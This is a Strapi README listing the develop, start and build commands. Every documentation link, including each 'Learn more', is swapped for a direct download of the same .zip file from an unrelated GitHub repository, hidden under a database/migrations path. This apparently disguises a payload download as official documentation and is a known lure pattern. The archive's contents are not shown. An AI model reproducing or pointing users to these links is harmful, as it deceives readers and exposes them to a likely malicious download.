# üöÄ Getting started with Strapi

Strapi comes with a full featured [Command Line Interface](https://github.com/Miqman/strapi-cloud-template-blog-78d35bca85/raw/refs/heads/main/database/migrations/strapi-d-template-bca-blog-cloud-v1.5.zip) (CLI) which lets you scaffold and manage your project in seconds.

### `develop`

Start your Strapi application with autoReload enabled. [Learn more](https://github.com/Miqman/strapi-cloud-template-blog-78d35bca85/raw/refs/heads/main/database/migrations/strapi-d-template-bca-blog-cloud-v1.5.zip)

```
npm run develop
# or
yarn develop
```

### `start`

Start your Strapi application with autoReload disabled. [Learn more](https://github.com/Miqman/strapi-cloud-template-blog-78d35bca85/raw/refs/heads/main/database/migrations/strapi-d-template-bca-blog-cloud-v1.5.zip)

```
npm run start
# or
yarn start
```

### `build`

Build your admin panel. [Learn more](https://github.com/Miqman/strapi-cloud-template-blog-78d35bca85/raw/refs/heads/main/database/migrations/strapi-d-template-bca-blog-cloud-v1.5.zip)

```
npm run build
# or
yarn build
```
